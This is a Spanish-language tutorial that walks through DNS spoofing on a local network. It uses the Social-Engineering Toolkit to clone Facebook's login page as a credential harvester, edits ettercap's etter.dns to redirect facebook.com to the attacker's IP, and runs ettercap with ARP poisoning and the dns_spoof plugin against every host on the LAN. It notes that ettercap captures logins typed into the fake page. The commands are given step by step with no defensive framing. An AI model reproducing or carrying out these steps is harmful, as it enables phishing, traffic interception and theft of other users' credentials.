# Tutorial DNS Spoofing


Herramientas:
- Kali Linux (no del todo necesario, pero si linux)
- Netoolkit
- Ettercap
- Ingenieria social entre otras

El DNS spoofing consiste en un metodo para alterar direcciones de los servidores DNS en redes de tal forma que nos permite suplantar la identidad de ciertas entidades

**palabras claves** : DNS, spoofing, Man in the Middle

### PASO 1:

escriba los siguientes comandos en la consola de kali

    $ Setoolkit

este comando nos mostrara la consola de **setoolkit** con todas las opciones disponibles, para nuestro caso escogeremos las opciones para la clonacion de una pagina web como sigue:

Social-Engineering Attacks -> Website Attacks Vector -> Credential Harvester Attack Method -> Site Cloner

### Paso 2:

en la consola de **setoolkit**

    set:webattack> <my ip here>   ## aqui ponemos la ip de nuestro equipo
    set:webattack> Enter the url to clone: < my url to clone here >  ## aqui ponemos la direccion de la pagina que queremos clonar, ej: www.facebook.com


luego de esto nuestro **setoolkit** ya habra clonado la pagina

### Paso 3

Ettercap es un interceptor/sniffer/registrador para LANs con switch. Soporta direcciones activas y pasivas de varios protocolos (incluso aquellos cifrados, como SSH y HTTPS). También hace posible la inyección de datos en una conexión establecida y filtrado al vuelo aun manteniendo la conexión sincronizada gracias a su poder para establecer un Ataque Man-in-the-middle(Spoofing).

Para nuestro tutorial lo usaremos para suplantar la identidad de la pagina que atacamos. En la terminal de kali ponemos lo siguiente:

    $ vim /etc/ettercap/etter.dns  ##pueden usar el editor que gusten



aqui encontraremos algunos ejemplos de como poner nuestra ip + dominio similar a como se hace en los archivos de servidores DNS de zonas:

    www.facebook.com A <my ip here>
    http://facebook.com A <my ip here>
    facebook.com A <my ip here>
    # etc        


luego cerramos y guardamos el archivo.

### Paso 4

Por ultimo ponemos el siguiente comando en la consola de kali:

    $ ettercap -Tqi eth0 -P dns_spoof -M arp /// ///

 explicacion:
 - -T = text mode
 - -q = quiet
 - -i = interface (eth0 en este caso)
 - -P dns_spoof = usar el plugin dns spoof de ettercap
 - -M arp = Man in the Middle Addres resolution protocol
 - /// /// = son todas las maquinas de la red, tambien podriamos haber puesto: /ip1// /ip2// con ip1 e ip2 un rango de ip's o una ip fija

 con esto ya habremos hecho la suplantacion en nuestra red local y para testear que todo funciona podemos ingresar a la web desde cualquier equipo de nuestra red y estaremos ingresando a la pagina clonada por nosotros. Cabe destacar que si la pagina tiene un metodo de loguin, e sposible que ettercap capture el texto ingresado en ellos y entregados por consola.
